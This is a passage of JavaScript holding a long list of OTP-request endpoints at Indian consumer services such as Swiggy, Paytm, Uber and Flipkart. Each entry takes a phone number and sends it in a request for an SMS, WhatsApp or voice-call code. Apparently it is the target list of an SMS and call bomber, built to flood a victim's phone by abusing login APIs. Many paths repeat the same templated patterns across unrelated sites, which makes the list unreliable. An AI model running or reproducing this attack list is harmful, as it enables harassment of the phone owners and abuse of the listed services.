  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho Call', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Paytm Call', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Rapido SMS', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra SMS', 'url': 'https://myntra.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': '1Mg WhatsApp', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit Call', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobile": "${phone}"}` },
  { 'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
  { 'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phoneNumber": "${phone}", "otpType": "voice"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"number": "${phone}", "otpOnCall": true}` },
  { 'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"phone": "${phone}", "countryCode": "91"}` },
  { 'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': (phone) => `{"mobileNumber": "${phone}"}` },
